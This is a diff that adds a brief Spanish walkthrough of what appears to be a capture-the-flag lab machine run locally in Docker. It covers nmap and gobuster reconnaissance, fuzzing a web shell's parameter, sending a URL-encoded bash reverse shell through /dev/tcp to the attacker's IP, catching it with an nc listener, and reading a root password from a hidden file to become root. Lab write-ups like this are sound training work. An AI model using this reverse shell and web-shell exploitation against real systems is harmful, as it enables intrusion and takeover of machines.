@@ -1,0 +1,37 @@
+Copiar el archivo y pegarlo en Kali 
+extraer los archivos 
+
+cd /home/kali/Desktop
+ls
+cd whereismyweb
+ls
+ 
+chmod +x auto_deploy.sh
+
+sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
+apt update 
+
+./auto_deploy.sh showtime.tar
+nmap -p- -sS -n 172.17.0.2
+
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,py,sh
+
+http://172.17.0.2/warning.html
+
+wfuzz -c --hl=0 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
+
+http://172.17.0.2/shell.php?parameter=id
+
+Enviamos la revershell http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/192.168.244.129/443 0>%261" Los "%26" corresponden al símbolo "&" de forma URL-encodeada para que no den conflicto. Y siendo la 192.168.244.129 la IP de mi máquina atacante.
+
+nc -nlvp 443
+
+sudo -l
+cd /tmp
+ls -la
+
+cat .secret.txt
+contraseñaderoot123
+su root
+contraseñaderoot123
+whoami = root
